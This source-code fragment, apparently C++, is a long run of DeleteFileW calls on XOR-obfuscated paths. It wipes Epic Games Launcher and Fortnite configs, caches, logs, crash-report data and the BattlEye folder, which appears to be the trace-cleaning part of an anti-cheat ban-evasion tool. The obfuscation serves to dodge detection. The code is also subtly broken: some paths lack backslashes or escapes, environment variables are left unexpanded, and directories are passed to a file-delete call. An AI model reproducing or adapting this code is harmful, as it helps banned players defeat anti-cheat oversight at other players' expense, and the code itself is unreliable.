	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\BaseWindowsLightmass.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Engine\\Config\\Windows\\WindowsGame.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)\\Epic Games\\Launcher\\Portal\\Config\\UserLightmass.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Engine\\Config\\BaseHardware.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Portal\\Config\\NotForLicensees\\Windows\\WindowsHardware.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files(x86)Epic Games\\Launcher\\Portal\\Config\\UserScalability.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\CMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite1\\FortniteGame\\PersistentDownloadDir\\EMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Config\\NoRedist\\Windows\\ShippableWindowsGameUserSettings.ini"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\FortniteClient-Win64-Shipping.exe.local"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\SharedFiles:VersionCache"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\d7fef8f9-801d-49d9-a684-6babe0ef53ca\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\e6a49143-8892-41ce-8a92-f2ec698a4ab8\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\f825e79d-e5c6-4583-ad21-9af36ff4ec56\\index-dir\\the-real-index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\index.txt"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\000003.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\CURRENT"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database\\LOCK"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\5dbdef24-37ef-4a7a-ba75-ee9bc4a22645"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\5dbdef24-37ef-4a7a-ba75-ee9bc4a22645\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\b90b1134-2a94-4983-be85-2c213daffc4d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\b90b1134-2a94-4983-be85-2c213daffc4d\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\dacadf8b-e278-424e-8f13-649b4a298a56"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39ca108634434c91f1\\dacadf8b-e278-424e-8f13-649b4a298a56\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\Database"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\HiddenWebhelperCache\\Service Worker\\ScriptCache\\index-dir"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\EMS\\stage"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\d945f059b8b54aa58202ed2989bebfc8"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-AED3596C4ADFAC4DB9E422A6546810D3"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Demos"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\Logs"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%Username%\\AppData\\Local\\BattlEye"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Program Files (x86)\\Epic Games\\Launcher\\Portal\\Content\\New UI\\White.png"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\index"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_2"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\GPUCache\\data_3"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\f1cdccba37924bda_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\ba23d8ecda68de77_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\67a473248953641b_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\fa813c9ad67834ac_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\b6c28cea6ed9dfc1_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\013888a1cda32b90_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\297ecea5cebb5dfe_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\297ecea5cebb5dfe_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\d0757ff92c7cde0a_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\d0757ff92c7cde0a_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\8d46ab1a9ac0f366_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\5abee1ee2254817d_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\0356df83-3d29-4e29-b98c-1b42a5fc821e\\fe0c4ca0c0cbe875_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\LOG.old~RF2b7b49.TMP"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\CURRENT"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\MANIFEST-000001"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\IndexedDB\\https_www.epicgames.com_0.indexeddb.leveldb\\000003.log"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00004d"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\c44640e897c9901e_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\d6859a2166934330_0"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\c44640e897c9901e_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\d6859a2166934330_1"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\ScriptCache\\index-dir\\the-real-index~RF2b8e06.TMP"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\c2ce0abb-57db-483b-84ed-93d43c206a52\\index-dir\\the-real-index~RF2b8e06.TMP"));
	DeleteFileW(XorWideString(L"%systemdrive%\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Service Worker\\CacheStorage\\e60030e2e5440743857a39cacd108634434c91f1\\0356df83-3d29-4e29-b98c-1b42a5fc821e\\index-dir\\the-real-index~RF2b8e06.TMP"));
	DeleteFileW(XorWideString(L"C:\Program Files\Epic Games\Fortnite\FortniteGame\Binaries\Win64\Shared Files"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Intermediate\\Config\\CoalescedSourceConfigs\\PortalRegions.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-72CCB9004D132462217ECE948BC03CBE\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\CrashReportClient\\UE4CC-Windows-E3661BE544621B07B291448442161091\\CrashReportClient.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Compat.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\EditorPerProjectUserSettings.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Engine.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Game.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Hardware.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Input.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\Lightmass.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Config\\Windows\\PortalRegions.ini"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\65f6b08d488442e694b1e23d152d971e.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\b371f0ee15b74eba84bd23830461130c.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_65f6b08d488442e694b1e23d152d971e.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Data\\OC_b371f0ee15b74eba84bd23830461130c.dat"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\cef3.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\Logs\\EpicGamesLauncher_2.log"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_0"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_1"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_2"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\data_3"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000001"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000002"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000004"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000005"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000006"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000007"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000008"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000009"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000a"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000b"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000c"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000d"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000e"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_00000f"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000010"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000011"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000012"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000013"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000014"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000015"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000016"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000017"));
	DeleteFileW(XorWideString(L"C:\\Users\\%username%\\AppData\\Local\\EpicGamesLauncher\\Saved\\webcache\\Cache\\f_000018"));
